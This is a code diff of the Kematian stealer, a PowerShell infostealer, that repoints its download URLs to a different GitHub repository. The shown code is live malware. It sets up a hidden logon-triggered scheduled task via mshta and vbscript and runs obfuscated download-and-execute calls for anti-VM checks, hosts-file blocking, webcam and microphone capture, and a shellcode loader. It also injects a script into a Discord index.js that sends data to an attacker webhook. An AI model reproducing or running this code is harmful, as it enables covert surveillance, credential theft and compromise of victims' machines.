@@ -85,10 +85,10 @@ function Invoke-TASKS {
         $KDOT_DIR.Attributes = "Hidden", "System"
         $task_name = "Kematian"
         $task_action = if ($debug) {
-            New-ScheduledTaskAction -Execute "Powershell.exe" -Argument "-ExecutionPolicy Bypass -NoProfile -C `"`$webhook='$webhook';`$debug=`$$debug;`$vm_protect=`$$vm_protect;`$encryption_key ='$encryption_key';`$blockhostsfile=`$$blockhostsfile;`$criticalprocess=`$$criticalprocess;`$melt=`$$melt;`$fakeerror=`$$fakeerror;`$persistence=`$$persistence;`$write_disk_only=`$False;`$t = Iwr -Uri 'https://raw.githubusercontent.com/Pirate-Devs/Kematian/main/frontend-src/main.ps1'|iex`""
+            New-ScheduledTaskAction -Execute "Powershell.exe" -Argument "-ExecutionPolicy Bypass -NoProfile -C `"`$webhook='$webhook';`$debug=`$$debug;`$vm_protect=`$$vm_protect;`$encryption_key ='$encryption_key';`$blockhostsfile=`$$blockhostsfile;`$criticalprocess=`$$criticalprocess;`$melt=`$$melt;`$fakeerror=`$$fakeerror;`$persistence=`$$persistence;`$write_disk_only=`$False;`$t = Iwr -Uri 'https://raw.githubusercontent.com/0x559/Kematian-stealer/main/frontend-src/main.ps1'|iex`""
         }
         else {
-            New-ScheduledTaskAction -Execute "mshta.exe" -Argument "vbscript:createobject(`"wscript.shell`").run(`"powershell `$webhook='$webhook';`$debug=`$$debug;`$vm_protect=`$$vm_protect;`$encryption_key ='$encryption_key';`$blockhostsfile=`$$blockhostsfile;`$criticalprocess=`$$criticalprocess;`$melt=`$$melt;`$fakeerror=`$$fakeerror;`$persistence=`$$persistence;`$write_disk_only=`$False;`$t = Iwr -Uri 'https://raw.githubusercontent.com/Pirate-Devs/Kematian/main/frontend-src/main.ps1'|iex`",0)(window.close)"
+            New-ScheduledTaskAction -Execute "mshta.exe" -Argument "vbscript:createobject(`"wscript.shell`").run(`"powershell `$webhook='$webhook';`$debug=`$$debug;`$vm_protect=`$$vm_protect;`$encryption_key ='$encryption_key';`$blockhostsfile=`$$blockhostsfile;`$criticalprocess=`$$criticalprocess;`$melt=`$$melt;`$fakeerror=`$$fakeerror;`$persistence=`$$persistence;`$write_disk_only=`$False;`$t = Iwr -Uri 'https://raw.githubusercontent.com/0x559/Kematian-stealer/main/frontend-src/main.ps1'|iex`",0)(window.close)"
         }
         $task_trigger = New-ScheduledTaskTrigger -AtLogOn
         $task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable
@@ -96,14 +96,14 @@ function Invoke-TASKS {
         Write-Host "[!] Persistence Added" -ForegroundColor Green
     }
     if ($blockhostsfile) {
-        $link = "https://github.com/Pirate-Devs/Kematian/raw/main/frontend-src/blockhosts.ps1"
+        $link = "https://github.com/0x559/Kematian-stealer/raw/main/frontend-src/blockhosts.ps1"
         iex (iwr -Uri $link -UseBasicParsing)
     }
     Backup-Data
 }
 
 function VMPROTECT {
-    $link = ("https://github.com/Pirate-Devs/Kematian/raw/main/frontend-src/antivm.ps1")
+    $link = ("https://github.com/0x559/Kematian-stealer/raw/main/frontend-src/antivm.ps1")
     iex (iwr -uri $link -useb)
     Write-Host "[!] NOT A VIRTUALIZED ENVIRONMENT" -ForegroundColor Green
 }
@@ -1101,7 +1101,7 @@ function Backup-Data {
     # webcam 
     if ($webcam) {
         Write-Host "[!] Capturing an image with Webcam" -ForegroundColor Green
-        $webcam = ("https://github.com/Pirate-Devs/Kematian/raw/main/frontend-src/webcam.ps1")
+        $webcam = ("https://github.com/0x559/Kematian-stealer/raw/main/frontend-src/webcam.ps1")
         $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$webcam')"
         $invokewebcam = Start-Process "powershell" -Argument "I'E'X($download)" -NoNewWindow -PassThru
         $invokewebcam.WaitForExit()
@@ -1117,7 +1117,7 @@ function Backup-Data {
     # record mic for 10 sec
     if ($record_mic) {
         Write-Host "[!] Recording PC MIC for 10 seconds" -ForegroundColor Green
-        $mic = ("https://github.com/Pirate-Devs/Kematian/raw/main/frontend-src/mic.ps1")
+        $mic = ("https://github.com/0x559/Kematian-stealer/raw/main/frontend-src/mic.ps1")
         $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$mic')"
         $invokemic = Start-Process "powershell" -Argument "I'E'X($download)" -NoNewWindow -PassThru
         $invokemic.WaitForExit()
@@ -1156,7 +1156,7 @@ function Backup-Data {
                 foreach ($file in $files) {
                     if ($file.Name -eq "index.js") {
                         $webClient = New-Object System.Net.WebClient
-                        $content = $webClient.DownloadString("https://raw.githubusercontent.com/Pirate-Devs/Kematian/main/frontend-src/injection.js")
+                        $content = $webClient.DownloadString("https://raw.githubusercontent.com/0x559/Kematian-stealer/main/frontend-src/injection.js")
                         if ($content -ne "") {
                             $data_webhook = $webhook -replace "/data", "/injection"
                             $replacedContent = $content -replace "%WEBHOOK%", $data_webhook
@@ -1171,7 +1171,7 @@ function Backup-Data {
     #Shellcode loader, Thanks to https://github.com/TheWover for making this possible !
     
     Write-Host "[!] Injecting Shellcode" -ForegroundColor Green
-    $kematian_shellcode = ("https://github.com/Pirate-Devs/Kematian/raw/main/frontend-src/kematian_shellcode.ps1")
+    $kematian_shellcode = ("https://github.com/0x559/Kematian-stealer/raw/main/frontend-src/kematian_shellcode.ps1")
     $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$kematian_shellcode')"
     $proc = Start-Process "powershell" -Argument "I'E'X($download)" -NoNewWindow -PassThru
     $proc.WaitForExit()
